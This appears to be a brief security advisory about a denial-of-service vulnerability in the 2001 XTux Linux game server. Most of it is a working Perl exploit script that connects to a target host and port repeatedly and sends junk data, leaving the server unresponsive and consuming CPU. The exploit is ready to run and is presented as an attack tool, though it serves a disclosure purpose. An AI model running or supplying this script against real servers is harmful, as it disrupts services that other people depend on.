source: http://www.securityfocus.com/bid/4260/info

XTux is a multiplayer network game for Linux. The server component (June 01, 2001 version) is vulnerable to a denial of service initiated by connecting to the server and sending unexpected characters. This causes the server to become unresponsive and consume resources. 

#!/usr/bin/perl
#
# xtux server DoS - by b0iler
# server will become unresponcive and takes up lots of CPU.

use IO::Socket;

for($n=0;$n<=3;$n++){ #you shouldn't even need all 3 connections.
        print "Connecting to $ARGV[0] port $ARGV[1]\n";
        $sock = IO::Socket::INET->new(PeerAddr => $ARGV[0],  PeerPort =>
$ARGV[1], Proto    => 'tcp' ) or print "\ncouldn't connect\n\n";
        sleep 3;
        print $sock "garbage data\n\n";
}
exit;
